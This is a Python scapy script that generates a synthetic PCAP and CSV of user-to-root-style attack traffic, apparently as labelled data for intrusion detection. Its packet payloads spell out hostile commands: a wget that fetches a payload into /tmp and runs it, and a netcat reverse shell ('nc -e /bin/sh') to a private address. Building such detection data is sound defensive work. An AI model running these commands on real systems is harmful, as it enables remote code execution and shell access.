#!/usr/bin/env python3
"""
Verbose U2R-like PCAP generator (command-like payloads + high-entropy blob).
Shows progress prints.
"""
from scapy.all import IP, TCP, Ether, Raw, wrpcap
import random, time, sys, secrets, csv

OUT_PCAP = "u2r_like.pcap"
OUT_CSV = "u2r_flows.csv"

src_ip = "10.0.0.77"
dst_ip = "10.0.0.7"
dst_port = 4444

def print_status(msg):
    print(msg)
    sys.stdout.flush()

try:
    from tqdm import trange
    use_tqdm = True
except Exception:
    use_tqdm = False

def main():
    print_status("Starting U2R-like PCAP generator.")
    pkts = []
    ts = 0.0

    cmd_payloads = [
        b"wget http://10.0.0.7/payload -O /tmp/p",
        b"chmod +x /tmp/p; /tmp/p",
        b"nc -e /bin/sh 10.0.0.8 4444"
    ]
    print_status("Creating small command-like payload packets...")
    for i, pl in enumerate(cmd_payloads):
        ts += random.uniform(0.05, 0.5)
        p = Ether()/IP(src=src_ip,dst=dst_ip)/TCP(sport=random.randint(2000,60000),dport=dst_port,flags="PA")/Raw(load=pl)
        p.time = ts
        pkts.append(p)
        if (i+1) % 1 == 0:
            print_status(f"  -> created command payload packet {i+1}/{len(cmd_payloads)}")

    print_status("Creating high-entropy binary-like transfer (split into chunks)...")
    blob = secrets.token_bytes(1024)  # random bytes for entropy
    chunk_size = 200
    n_chunks = (len(blob)+chunk_size-1)//chunk_size
    rng = range(n_chunks)
    if use_tqdm:
        rng = trange(n_chunks, desc="Creating blob chunks")
    for i in rng:
        start = i*chunk_size
        chunk = blob[start:start+chunk_size]
        ts += random.uniform(0.005, 0.02)
        p = Ether()/IP(src=src_ip,dst=dst_ip)/TCP(sport=random.randint(2000,60000),dport=dst_port,flags="PA")/Raw(load=chunk)
        p.time = ts
        pkts.append(p)
        if not use_tqdm and (i+1) % 5 == 0:
            print_status(f"  -> created chunk {i+1}/{n_chunks}")

    print_status(f"Total packets to write: {len(pkts)}. Writing PCAP {OUT_PCAP} ...")
    wrpcap(OUT_PCAP, pkts)
    print_status("Writing CSV metadata ...")
    with open(OUT_CSV, "w", newline='') as f:
        w = csv.writer(f)
        w.writerow(["src","dst","sport","dport","start","end","pkts","bytes","label"])
        start_ts = pkts[0].time if pkts else 0.0
        end_ts = pkts[-1].time if pkts else 0.0
        total_bytes = sum(len(bytes(p)) for p in pkts)
        w.writerow([src_ip, dst_ip, "-", dst_port, f"{start_ts:.6f}", f"{end_ts:.6f}", len(pkts), total_bytes, "U2R_like"])
    print_status(f"Wrote {OUT_PCAP} and {OUT_CSV}. Done.")

if __name__ == "__main__":
    main()
